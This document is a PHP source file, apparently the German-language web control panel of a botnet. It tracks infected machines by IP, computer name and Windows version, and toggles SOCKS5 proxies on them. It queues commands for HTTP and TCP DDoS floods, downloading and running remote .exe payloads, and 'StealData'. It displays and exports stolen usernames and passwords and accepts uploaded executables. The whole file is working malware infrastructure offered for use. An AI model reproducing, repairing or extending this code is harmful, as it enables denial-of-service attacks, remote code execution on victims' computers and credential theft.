<?php
function safe_sql($value){
   return mysql_real_escape_string($value);
} 

function safe_xss($value){
	return htmlspecialchars($value);
}

function show_NStats(){	  
	//Bots Online
	$query = "SELECT COUNT(*) as Anzahl FROM bots WHERE status = 1";
	$queryerg = mysql_query($query) OR die(mysql_error());
	while($row = mysql_fetch_array($queryerg)){
	  $bot_online = $row[0];
	} 

	//Bots Offline
	$query = "SELECT COUNT(*) as Anzahl FROM bots WHERE status = 0";
	$queryerg = mysql_query($query) OR die(mysql_error());
	while($row = mysql_fetch_array($queryerg)){
	  $bot_offlline = $row[0];
	} 

	//Bots Gesamt
	$query = "SELECT COUNT(*) as Anzahl FROM bots";
	$queryerg = mysql_query($query) OR die(mysql_error());
	while($row = mysql_fetch_array($queryerg)){
	  $bot_gesamt = $row[0];
	} 

	$on  = $bot_online;
	$off = $bot_offlline;
	$all = $bot_gesamt;


	$all2 = '&nbsp;'.$all.'&nbsp;(100%)';


	if($all != 0){
		$on = $on.'&nbsp;('.round($on/$all*100,0).'%)';
	}

	if($all != 0){
		$off = $off.'&nbsp;('.round($off/$all*100,0).'%)';
	}
	
	echo '<div class="right">
			<strong>Alle:</strong> '.$all.'
		    <strong>Online:</strong> '.$on.'
		    <strong>Offline:</strong> '.$off.'
		  </div>';
}

function show_countrys(){
	include('inc/code2country.php');
	include('pie.php');		
}

function show_tasks(){
	echo '<div id="tasks">
		  <h3>Aufgaben</h3>
		  <table>
		  <tr>
			<th>Command</th>
			<th>Countrys</th>
			<th>CMD Free</th>
			<th>Bots/Done</th>
			<th>OK</th>
			<th>Delete</th>
		  </tr>';
		  
		$query1 = mysql_query("SELECT * FROM tasks");
		while($row = mysql_fetch_array($query1))
		{
		  $split = explode(',', safe_xss($row['countries']));
		  
		  echo '<tr>
				  <td style="text-align: left;">'.safe_xss($row['command']).'</td>
		        <td>';	
				
				if(empty($split[0])){
					echo '<img src="img/00.gif" /> (All)';
				}else{					
					for($i = 0; $i <= 4; $i++){
						echo '<img src="img/'.$split[$i].'.gif" />&nbsp;';
					}
					if(!empty($split[5])){
						echo ' ... [<a href="" onClick="javascript:popUp(\'other/showall.php?id='.safe_xss($row['id']).'\')">show all</a>]';
					}
				}
		  
		  echo '</td>
				<td>'.safe_xss($row['time']).'</td>';
		  
		  
		  if(safe_xss($row['bots']) == safe_xss($row['done'])){
			echo '<td style="background-color: #ABC886">'.safe_xss($row['bots']).' / '.safe_xss($row['done']).'</td>';
		  }else{
			echo '<td style="background-color: #FFC2C2;">'.safe_xss($row['bots']).' / '.safe_xss($row['done']).'</td>';
		  }
		  
		  echo '<td style="">'.percent(safe_xss($row['done']),safe_xss($row['bots'])).'%</div></td>';
		  
		  if(safe_xss($row['bots']) != safe_xss($row['done'])){
			echo '<td style=""><a href="index.php?id=tasks&cmd='.safe_xss($row['command']).'" onClick="javascript:return(confirm(\'bots != done\nTask '.safe_xss($row['id']).' delete now?\'))"><b style="color: red;"><img src="img/del.png" /></b></a></td>';
		  }else{
			echo '<td style=""><a href="index.php?id=tasks&cmd='.safe_xss($row['command']).'" onClick="javascript:return(confirm(\'Task '.safe_xss($row['id']).' delete now?\'))"><b style="color: red;"><img src="img/del.png" /></b></a></td>';
		  }
		  
		  echo '</tr>';
		}
		  
	echo '</table></div>';
	
	//Del tasks / Add new
	echo '<br />
			<form action="index.php?deletetasks" method="get">
				<input type="radio" name="del" value="1" />Alle fertigen Tasks &nbsp;<b>OR</b>&nbsp;<input type="radio" name="del" value="2" />Alle Tasks &nbsp;<input type="submit" name="deletetasks" class="btn" value="L&ouml;schen" />
			</form>	  
			<br />
			
			<div class="hervor" style="padding: 10px;">
			<form action="index.php" method="post">
				Befehl: <br /><input id="cmd" type="text" class="tb" name="cmd" style="width: 98%;" /> <br />
				Anzahl: <br /><input id="count" type="text" class="tb" name="count" style="width: 10%;" /> <br />
				Wann ausf&uuml;hren?: <br /><input id="execute" type="text" class="tb" name="execute" value="'.date('Y-m-d H:i:s').'" style="width: 30%;" /> <br /><br />
				
				<input type="submit" name="addcmd" class="btn" value="Befehl absenden!" />
			</form>
			
			<br />
					
			<script type="text/javascript">
			function loadXMLDoc(host)
			{
			var xmlhttp;
			if (window.XMLHttpRequest)
			  {
			  xmlhttp=new XMLHttpRequest();
			  }
			else
			  {// code for IE6, IE5
			  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
			  }
			xmlhttp.onreadystatechange=function()
			  {
			  if (xmlhttp.readyState==4 && xmlhttp.status==200)
				{
				document.getElementById("antwort").innerHTML=xmlhttp.responseText;
				}
			  }
			xmlhttp.open("GET","index.php?host=" + host,true);
			xmlhttp.send();
			}
			</script>

			  <div class="hervor_ajax" style="padding: 10px;">
			    <p><strong class="hosttoip">Host to IP f&uuml;r TCP DDoS</strong></p>		
				<span class="hosttoip">Website:</span>&nbsp;<input type="text" id="website" style="width: 50%;" value="beispiel.ch" onclick="this.value = \'\';" />
				
				<button class="btn" onclick="loadXMLDoc(document.getElementById(\'website\').value);">IP Adresse anzeigen</button>
				
				<div id="antwort"></div>
			  </div>
			</div>
			
			<h3>Befehle</h3>
			
			<ul>
				<h4>DDoS</h4>
				<li>StartHTTP*seite*port*threads*sockets*sleeptime</li>
				<li>StartTCP*ip*port*threads*sockets*sleeptime</li>
				<li>StopHTTPDDoS</li>
				<li>StopTCPDDoS</li>
				<li>StopDDoS</li>
				
				<h4>Anderes</h4>
				<li>DownloadEx*http://www.server.ch/abc.exe*exename</li>
				<li>Update*http://www.server.ch/abc.exe*exename</li>
				<li>StealData</li>
			</ul>
		  ';
}

function show_bots(){
include('inc/p.class.php');
include('inc/config.php');
include('inc/code2country.php');

$time_now = date('Y-m-d H:i:s');

echo '<h3>Deine Bots</h3>
	 <div id="nopie">
	 <table style="width: 100%;">
	  <tr>
		<th>ID</th>
		<th>Land</th>
		<th>IP Adresse</th>
		<th>Lokale IP</th>
		<th>Computer</th>
		<th>Windows Version</th>
		<th>Status</th>
		<th>Socks5 m&ouml;glich?</th>
	  </tr>';

$query1 = mysql_query("SELECT COUNT(*) FROM bots");
$item_count = mysql_result($query1, 0);
$nav = new PageNavigation($item_count, 20);
$query1 = mysql_query("SELECT * FROM bots ORDER BY id ASC LIMIT ".safe_sql($nav->sql_limit));
$item_number = $nav->first_item_id;

  //$query1 = mysql_query("SELECT * FROM bots");
while($row = mysql_fetch_array($query1)){
  $hwid	 = safe_xss($row['hwid']);
  $status = safe_xss($row['status']);
	  
	echo '<tr>
	  <td style="">'.safe_xss($row['id']).'</td>';
		if(empty($row['country'])){
			echo '<td style=""><img src="img/00.gif" /></td>';
		}else{
			echo '<td style=""><img src="img/'.safe_xss($row['country']).'.gif" style="float: left;" /><span style="float: left; margin-left: 5px;">'.$ccode[strtoupper(safe_xss($row['country']))].'</span></td>';
		}
					
	echo  '
	   <td style="">'.safe_xss($row['ip']).'</td>
	   <td style="">'.safe_xss($row['localip']).'</td>
	   <td style="">'.safe_xss($row['pc']).'</td>
	   <td style="">'.safe_xss($row['winver']).'</td>';
	
	if($status == '1'){
		echo '<td style="color: green;">Online</td>';
	}else{
		echo '<td style="color: red;">Offline</td>';
	}
	
	if($row['ip'] == $row['localip']){
		if(safe_xss($row['socksaktiv']) == '1'){
		  echo '<td><img src="img/tick.png" /> (<a href="index.php?id=bots&p=0&socks=deactive&hwid='.$row['hwid'].'&status='.$row['status'].'">Deaktivieren</a>)</td>';
		}else{
		  echo '<td><img src="img/tick.png" /> (<a href="index.php?socks=active&hwid='.$row['hwid'].'&status='.$row['status'].'&ip='.$row['ip'].'">Aktivieren</a>)</td>';
		}
	}else{
		echo '<td><img src="img/cross.png" /></td>';
	}
}
	  
echo '</table></div><br /><div style="float: right; font-size: 11px;">'.$nav->createPageBar().'</div><br />';  

$query = "UPDATE bots SET status = 0 WHERE DATE_SUB('$time_now', INTERVAL ".$seconds." SECOND) > time";
    mysql_query($query) OR die(mysql_error());
}

function show_logs(){
include('inc/p2.class.php');

echo '
<script type="text/javascript">
function AlleBoxen()
 {
   for(var x=0;x<document.boxen.elements.length;x++)
     { var y=document.boxen.elements[x];
       if(y.name!=\'alle\') y.checked=document.boxen.alle.checked;
     }
 }
</script>';

echo '<h3>Stealer Logs (<a href="index.php?id=showlogs">Gespeicherte Logs anzeigen / l&ouml;schen</a>)</h3><br /> 
	 <table style="width: 100%;">
	  <tr>
		<th>ID</th>
		<th>Programm</th>
		<th>URL</th>
		<th>Username</th>
		<th>Passwort</th>
		<th>L&ouml;schen</th>
	  </tr>';
	
$query1 = mysql_query("SELECT COUNT(*) FROM logs");
$item_count = mysql_result($query1, 0);
$nav = new PageNavigation($item_count, 35);
$query1 = mysql_query("SELECT * FROM logs ORDER BY id ASC LIMIT ".safe_sql($nav->sql_limit));
$item_number = $nav->first_item_id;
	
while($row = mysql_fetch_array($query1)){
  echo '<form action="index.php" method="post" name="boxen"><tr>
			<td>'.safe_xss($row['id']).'</td>
			<td>'.safe_xss($row['programm']).'</td>
			<td>'.safe_xss($row['url']).'</td>
			<td>'.safe_xss($row['user']).'</td>
			<td>'.safe_xss($row['pass']).'</td>
			<td><input type="checkbox" name="dele[]" value="'.safe_xss($row['id']).'" /></td>
		</tr>';
}

echo '</table>
<br /><div class="hervor" style="padding: 10px;">
<input type="Checkbox" name="alle" onClick="AlleBoxen(this.form);" value="alle">Alle ausw&auml;hlen&nbsp;<input type="submit" class="btn" name="del" value="Ausgew&auml;hlte Logs l&ouml;schen" /></form>
<a href="index.php?delall" onClick="javascript:return(confirm(\'Wirklich entfernen?\'))"><button class="btn">Alle Logs l&ouml;schen</button></a>
<a href="index.php?downlogs"><button class="btn">Logs herunterladen</button></a></div><br />
<div style="float: right; font-size: 11px;">'.$nav->createPageBar().'</div><br />';  
}

function show_logsanddelete(){
	echo '<h2>Bereits gespeicherte Logs</h2>';

	$verz = opendir('downlogs');
	while ($file = readdir ($verz)) {
      if($file != "." && $file != ".." && $file != "index.html"){
		echo $file.' (<a href="downlogs/'.$file.'" target="_blank">Log &ouml;ffnen</a> , <a onClick="javascript:return(confirm(\'Log '.$file.' wirklich entfernen?\'))" href="index.php?delsavelog='.$file.'">Log l&ouml;schen</a>)<br />';
	  }
	}
	
	closedir($verz);  
}

//Uploader
function show_uploader(){

echo '
<h2>Deine Uploads</h2>

<table style="width: 500px;">
<tr>
	<th>Name</th>
	<th>Gr&ouml;sse</th>
	<th>L&ouml;schen</th>
</tr>';

$ordner = 'uploads';
$handle = opendir($ordner);
while($file = readdir($handle)){
    if(preg_match('/.exe/',$file) && $file != '.' && $file != '..'){
        if(!is_dir($ordner.'/'.$file)){
            $compl = $ordner.'/'.$file;
            echo '<tr>
					<td><a href="'.$compl.'">'.$file.'</a></td>
					<td>'.round((filesize($ordner.'/'.$file) / 1024), 2).' kb</td>
					<td><a href="index.php?delupp='.$file.'"><img src="img/del.png" /></a></td>
				  </tr>';
        }
    }
}
closedir($handle);

echo '</table>
<br />
<div class="hervor" style="padding: 10px;">
<form action="index.php" method="post" enctype="multipart/form-data">
	<input type="file" name="datei" class="tb" />&nbsp;
	<input type="submit" name="uploadfile" value="Datei hochladen (max. 1MB)">
</form>
</div>';
}

function random_string($laenge){
    $return = '';
	$chars = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'));
    
    for($i = 1; $i <= $laenge; $i++) {
        $return .= $chars[rand(0,62)];
    }
    
    return $return;
}  

function percent($done,$bots){
	return round($done / $bots * 100,2);
}
?>